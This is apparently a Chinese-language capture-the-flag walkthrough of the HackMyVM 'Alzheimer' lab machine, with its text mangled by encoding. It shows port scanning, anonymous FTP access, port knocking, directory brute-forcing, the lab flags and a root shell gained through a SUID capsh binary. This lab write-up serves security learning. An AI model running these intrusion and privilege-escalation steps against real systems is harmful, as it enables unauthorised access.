---
{"dg-publish":true,"tags":["HMV","SUIDææƒ","knock"],"éš¾åº¦":"ðŸ˜…","ä½œè€…":"sml","ç³»ç»Ÿ":"Linux","permalink":"/24-æ¸—é€/HMV/9.Alzheimer/","dgPassFrontmatter":true,"noteIcon":"2","created":"2024-11-22T19:13:18.856+08:00"}
---


## 1. åŸºæœ¬ä¿¡æ¯^toc

- [[24-æ¸—é€/HMV/9.Alzheimer#1. åŸºæœ¬ä¿¡æ¯^toc\|1. åŸºæœ¬ä¿¡æ¯]]
- [[24-æ¸—é€/HMV/9.Alzheimer#2. ä¿¡æ¯æ”¶é›†\|2. ä¿¡æ¯æ”¶é›†]]
- [[24-æ¸—é€/HMV/9.Alzheimer#3. ftpåŒ¿åç™»å½•\|3. ftpåŒ¿åç™»å½•]]
- [[24-æ¸—é€/HMV/9.Alzheimer#4. ææƒ\|4. ææƒ]]

```
é¶æœºé“¾æŽ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Alzheimer
```


```
ä½œè€…ï¼šsml
```

```
éš¾åº¦ï¼šæ­»é¢˜
```


```
çŸ¥è¯†ç‚¹ï¼šknockå‘½ä»¤ã€SUIDææƒï¼ˆcapshï¼‰
```

## 2. ä¿¡æ¯æ”¶é›†

ç«¯å£æ‰«æ

```Bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -sS 192.168.9.11 -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:23 CST
Nmap scan report for 192.168.9.11
Host is up (0.00034s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE
21/tcp open     ftp
22/tcp filtered ssh
80/tcp filtered http
MAC Address: 08:00:27:93:BB:DC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
```
å¯¹80 22è¿›è¡Œäº†é™åˆ¶

## 3. ftpåŒ¿åç™»å½•

```Bash
ftp 192.168.9.11
anonymous
```
é‡Œé¢æœ‰ä¸€ä¸ª.secretnote.txt æ–‡ä»¶

æŸ¥çœ‹

```Bash
cat .secretnote.txt 
I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
```
è§£å¯† 

æ„æ€æ˜¯æˆ‘ä»¬éœ€è¦è®¿é—®è¿™3000ä¸ªç«¯å£ ç„¶åŽå°±ä¼šæœ‰ä¸€ä¸ªæœåŠ¡æ‰“å¼€

ä¾æ¬¡è®¿é—®è¿™äº›ç«¯å£

```Bash
knock 192.168.9.11 1000 2000 3000 -v
```
ç„¶åŽé‡æ–°æ‰«æä¸€ä¸‹

```Bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -sS 192.168.9.11 -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:30 CST
Nmap scan report for 192.168.9.11
Host is up (0.00023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:93:BB:DC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
```
å¯ä»¥å‘çŽ°22 80éƒ½å¼€æ”¾äº†

è®¿é—®ç½‘ç«™

å•¥éƒ½æ²¡æœ‰

ç›´æŽ¥æ‰«ç›®å½•

```Bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# gobuster dir -u http://192.168.9.11/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.9.11/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 301) [Size: 185] [--> http://192.168.9.11/home/]
/admin                (Status: 301) [Size: 185] [--> http://192.168.9.11/admin/]
/secret               (Status: 301) [Size: 185] [--> http://192.168.9.11/secret/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
> æ•²äº†åŠå¤©å¼€ä¸äº†é—¨ã€‚ç›®å½•è®¿é—®ä¸äº†ã€‚åŽé¢çœ‹wpå‘çŽ°æ˜¯ç½‘å¡é—®é¢˜

è¿™é‡Œç›´æŽ¥ç»™flag

```Bash
root@alzheimer:~# cat /root/root.txt
HMVlovememories
root@alzheimer:~# cat /home/medusa/user.txt
HMVrespectmemories
root@alzheimer:~# 
```
è¿˜æ˜¯çœ‹ä¸‹é¢˜ç›®çš„è€ƒç‚¹å§ã€‚

æ•²é—¨æˆåŠŸåŽè®¿é—®ç½‘ç«™æ ¹ç›®å½•

![...](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png)

ä¸‹é¢åº”è¯¥æ˜¯ä¸€ä¸ªæ‘©æ–¯å¯†ç 

![...](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.002.png)

```Bash
OTHINGM
```
è¿™ä¸ªåº”è¯¥å°±æ˜¯medusaçš„å¯†ç äº†

ä½†æ˜¯æ˜¯ä¸å¯¹çš„

ç»§ç»­çœ‹ç½‘ç«™çš„å…¶ä»–ç›®å½•

adminç›®å½•æ˜¯ç©ºçš„

homeç›®å½•ä¸‹çš„æ–‡ä»¶æç¤ºæˆ‘ä»¬passåœ¨Homeç›®å½•ï¼Œä½†ä¸æ˜¯è¿™ä¸ªhomeç›®å½•

secretç›®å½•æç¤ºæˆ‘ä»¬å¯†ç åœ¨è¿™ä¸ªsecretç›®å½•çš„æŸä¸ªç›®å½•ä¸‹

é‚£å¯†ç å°±æ˜¯åœ¨/secret/homeç›®å½•

/secret/homeç›®å½•çš„æ–‡ä»¶ç»™äº†ä¸ªå•¥ç”¨æ²¡æœ‰çš„æç¤º

æ ¹ç›®å½•ç»™æˆ‘ä»¬è¯´ä»–å°†å¯†ç å†™å…¥äº†ä¸€ä¸ª.txtæ–‡ä»¶

åˆ°ç›®å‰ä¸ºæ­¢ï¼Œå”¯ä¸€èŽ·å–åˆ°çš„.txtæ–‡ä»¶å°±æ˜¯.secretnote.txt

```Bash
I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
```
é‡Œé¢çš„Ihavebeenalwayshere!!! å°±æ˜¯medusaçš„å¯†ç 

## 4. ææƒ

è™½ç„¶flagæœ‰äº†ï¼Œä½†è¿˜æ˜¯çœ‹çœ‹ææƒéƒ¨åˆ†å§

æ‹¿åˆ°ç”¨æˆ·medusaçš„æƒé™åŽ

```Bash
medusa@alzheimer:/root$ find / -perm -4000  2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/sbin/capsh
```


```Bash
capsh --gid=0 --uid=0 --
```
![...](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.003.png)


